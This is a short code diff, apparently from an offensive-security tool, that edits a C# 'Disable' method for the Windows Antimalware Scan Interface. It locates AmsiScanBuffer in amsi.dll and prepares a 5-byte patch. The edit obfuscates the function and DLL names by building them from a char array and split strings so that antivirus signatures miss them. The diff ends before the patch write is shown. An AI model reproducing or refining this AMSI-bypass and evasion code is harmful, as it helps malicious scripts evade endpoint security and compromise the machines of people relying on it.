@@ -19,8 +19,10 @@ namespace AMSI
 
         public static int Disable()
         {
-
-            IntPtr Address = GetProcAddress(LoadLibrary("amsi.dll"), "Amsi" + "Scan" + "Buffer");
+            char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
+            String funcName = string.Join("", chars);
+            
+            IntPtr Address = GetProcAddress(LoadLibrary("am" + "si.dll"), funcName);
 
             UIntPtr size = (UIntPtr)5;
             uint p = 0;
